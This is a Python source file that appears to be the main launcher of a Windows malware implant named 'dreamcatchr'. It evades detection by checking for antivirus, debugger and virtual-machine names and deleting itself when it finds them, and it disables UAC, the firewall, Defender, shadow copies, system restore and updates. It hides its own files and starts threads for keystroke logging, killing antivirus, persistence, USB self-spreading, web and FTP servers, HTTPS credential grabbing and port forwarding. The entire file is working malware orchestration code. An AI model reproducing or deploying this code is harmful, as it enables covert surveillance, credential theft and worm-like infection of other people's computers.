#!C:\Python27\python.exe
import pythoncom, pyHook
import os
import sys
import socket
import random
import base64
import datetime, time
import win32event, win32api, winerror
import win32console, win32gui
import tempfile
import win32com.shell.shell as win32shell
import wmi
from shutil import copyfile
from shutil import move
from binaries import DREAMR_B64

from config import *
window = win32console.GetConsoleWindow()
win32gui.ShowWindow(window, DEBUG_MODE)

print(":: Project Version %s ::" % VERSION)

# Open decoy app if decoy name
hideSelf = True
if USB_NAME in sys.argv[0]:
	hideSelf = False
	os.system("C:\\Windows\\write.exe")

# Check mutex to detect multilaunch
if (len(sys.argv) == 1):
	mutex = win32event.CreateMutex(None, 1, "dreamcatchr")
	if (win32api.GetLastError() == winerror.ERROR_ALREADY_EXISTS):
		os._exit(420)

# Stuff we want nothing to do wit
evadeList = ["avast", "norman", "comodo", "anitvirus", "virus", "reverse", "vmware-tray.exe", "vmmap.exe", "ollydbg.exe", "olly debug", "debugger", "debugging", "radare", "malware", "procdump.exe", "debug", "Procmon.exe", "norton", "trend micro", "eset", "kaspersky", "sandbox", "vmware", "virtualbox", "VBoxTray.exe", "VBoxService.exe", "Norton", "analyzing", "love"]
systemTokens = win32api.GetConsoleTitle().split(" ")
systemTokens.append(win32api.GetUserName())
systemTokens.append(win32api.GetDomainName())
systemTokens.append(win32api.GetComputerName())

# Path tokens
for token in os.getcwd().split("\\"):
	systemTokens.append(token)

# Process tokens
drmwmi = wmi.WMI()
for process in drmwmi.Win32_Process():
	systemTokens.append(process.Name)

from core import *

# Post imports for actual execution
byeUAC()
byeHiddenFiles()
byeFirewall()
byeNotify()
byeErrorReporting()
byeShadowing()
byeSystemRestore()
byeWindowsUpdate()
byeDefender()
byeTelemetry()

# Test all tokens against the list
for item in evadeList:
	for token in systemTokens:
		if (item == token):
			print("exit reason %s" % token)
			if not DEBUG_MODE:
				melt()
				os._exit(0)

# Make the web directory and move it into place
try:
	os.mkdir("www")
	shutil.copytree("www", WebPath)
except:
	pass

try:
	os.mkdir("cert")
	shutil.copytree("cert", KeyPath)
except:
	pass

if not "svchost.exe" in sys.argv[0]:
	try:
		os.rmdir("www")
	except:
		pass
	try:
		os.rmdir("cert")
	except:
		pass

time.sleep(3)

# Move self to binary location
try:
	debug("main", "move %s -> %s" % (sys.argv[0], BinaryLocation))
	move(sys.argv[0], "%s" % BinaryLocation)
	copyfile(BinaryLocation, sys.argv[0])
except Exception as e:
	print("%s" % str(e))
	try:
		copyfile(BinaryLocation, sys.argv[0])
	except Exception as e:
		print("%s" % str(e))

# Hide everything that needs to be hidden
hideFile(BinaryLocation)
hideFile(DreamrLocation)
if (hideSelf):
	hideFile(sys.argv[0])

try:
	win32api.SetFileAttributes("%s\\www" % BasePath, win32con.FILE_ATTRIBUTE_HIDDEN)
except:
	pass

try:
	win32api.SetFileAttributes("%s\\cert" % BasePath, win32con.FILE_ATTRIBUTE_HIDDEN)
except:
	pass


### Keystroke/Window Logger ###
from logger import *
hook = pyHook.HookManager()
hook.KeyDown = keypressEvent
hook.HookKeyboard()
logger = LoggerThread().start()

### Kill Antivirus ###
from killav import *
KAVThread().start()

### Notifications/Reg Edits ###
from persist import *
ImplantPersistThread().start()

### Copy Self to USB ###
from usbspread import *
USBSpreadThread().start()

### Main Protocol ###
from protocol import *
ProtocolThread(False).start()

### WebServer Thread ###
from http import *
TornadoWebServer().start()

### FTP Thread ###
from ftp import *
FTPServer(WebPath).start()

### HTTP/HTTPS Grabber ###
from grabber import *
GrabberThread().start()

from quantum import *
QuantumNetworkThread().start()

from ports import *
PortForwardThread().start()

# ### PSEXEC Spreader ###
# from psexe import *

# PSEXE().start()
pythoncom.PumpMessages()